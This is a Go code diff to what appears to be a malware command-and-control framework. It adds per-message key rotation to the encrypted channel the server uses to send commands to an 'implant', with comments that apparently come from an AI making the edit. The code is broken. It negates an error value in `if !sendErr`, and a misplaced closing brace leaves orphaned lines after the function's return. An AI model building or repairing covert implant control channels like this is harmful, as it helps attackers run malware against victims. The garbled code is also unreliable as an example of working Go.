@@ -69,10 +69,6 @@ func readFromTransport(server transport.RegisteredComponent, shlyuzComponent *co
 	return data, true, nil
 }
 
-func rekey(frame routine.EncryptedFrame) {
-
-}
-
 func RouteInstruction(server *transport.RegisteredComponent, instruction instructions.InstructionFrame) {
 	switch cmd := instruction.Cmd; cmd {
 	case "rcmda": // issues a new command for the implant
@@ -101,7 +97,8 @@ func GenerateInitFrame(component component.Component) instructions.InstructionFr
 
 func RelayInitFrame(shlyuzComponent *component.Component, initFrame instructions.InstructionFrame, shlyuzTransport transport.TransportMethod) *component.Component {
 	frameMap, _ := json.Marshal(initFrame)
-	transmitFrame, _ := routine.PrepareSealedFrame(frameMap, shlyuzComponent.InitalRemotePubkey, shlyuzComponent.Config.CryptoConfig.XorKey, shlyuzComponent.Config.InitSignature)
+	// PrepareSealedFrame now only returns []byte
+	transmitFrame := routine.PrepareSealedFrame(frameMap, shlyuzComponent.InitalRemotePubkey, shlyuzComponent.Config.CryptoConfig.XorKey, shlyuzComponent.Config.InitSignature)
 	shlyuzComponent.TransportChannel = make(chan []byte)
 	go writeToChannel(shlyuzComponent.TransportChannel, transmitFrame)
 	boolSuccess, err := shlyuzTransport.Send(shlyuzComponent.TransportChannel)
@@ -161,12 +158,41 @@ func GenerateRequestInstruction(server *transport.RegisteredComponent) instructi
 }
 
 func RelayInstructionFrame(server *transport.RegisteredComponent, instruction instructions.InstructionFrame) *transport.RegisteredComponent {
-	instruction.Pk = server.CurKeyPair.PubKey
+	// Generate a new key pair for the sender (server) to use for its *next* transmission
+	nextOwnKeypair, err := asymmetric.GenerateKeypair()
+	if err != nil {
+		log.Println("CRITICAL: Failed to generate next own keypair in RelayInstructionFrame:", err)
+		// Depending on policy, might return server without sending, or panic, or try to send without key rotation.
+		// For now, let's log and proceed to send with the *current* Pk, effectively pausing rotation for this frame.
+		// A more robust solution would be to ensure key generation reliability or have a fallback.
+		// instruction.Pk = server.CurKeyPair.PubKey // Keep current Pk if new one fails
+	} else {
+		// Set the public key that this component (server) wants the peer to use for the peer's *next* reply.
+		// This is the public key of the keypair the server will use for receiving that reply.
+		// The subtask implies this Pk should be from nextOwnKeypair, meaning server rotates its receiving key now.
+		instruction.Pk = nextOwnKeypair.PubKey
+	}
+
 	dataFrame, _ := json.Marshal(instruction)
-	transmitFrame, frameKeyPair := routine.PrepareTransmitFrame(dataFrame, server.CurPubKey, server.CurKeyPair.PrivKey, server.XorKey)
-	server.CurKeyPair = frameKeyPair
+	// PrepareTransmitFrame now only returns []byte (the encrypted message)
+	// It uses server.CurKeyPair.PrivKey for this specific message's signing/authentication part of encryption.
+	// It encrypts to server.CurPubKey (the peer's public key).
+	transmitFrame := routine.PrepareTransmitFrame(dataFrame, server.CurPubKey, server.CurKeyPair.PrivKey, server.XorKey)
+
+	// After successfully preparing the frame for sending, update server's current key pair
+	// to the one whose public key was just advertised in instruction.Pk.
+	if err == nil { // Only update if key generation succeeded
+		server.CurKeyPair = nextOwnKeypair
+	}
+
 	go writeToChannel(server.CmdChannel, transmitFrame)
-	boolSuccess, err := server.Transport.Send(server.CmdChannel)
+	boolSuccess, sendErr := server.Transport.Send(server.CmdChannel)
+	if !sendErr { // check sendErr, not err from keygen
+		log.Fatalln("failed to send instruction: ", sendErr)
+	}
+	log.Println("sent instruction")
+	return server
+}
 	if !boolSuccess {
 		log.Fatalln("failed to send instruction: ", err)
 	}
@@ -181,8 +207,9 @@ func RetrieveInstruction(server *transport.RegisteredComponent) (instructions.In
 	if !boolSuccess {
 		return instruction, err
 	}
-	instructionData := routine.UnwrapTransmitFrame(data, server.CurPubKey, server.InitalKeyPair.PrivKey, server.XorKey)
+	instructionData := routine.UnwrapTransmitFrame(data, server.CurPubKey, server.CurKeyPair.PrivKey, server.XorKey)
 	instruction = decodeTransactionFrame(instructionData)
+	server.CurPubKey = instruction.Pk
 
 	return instruction, nil
 }
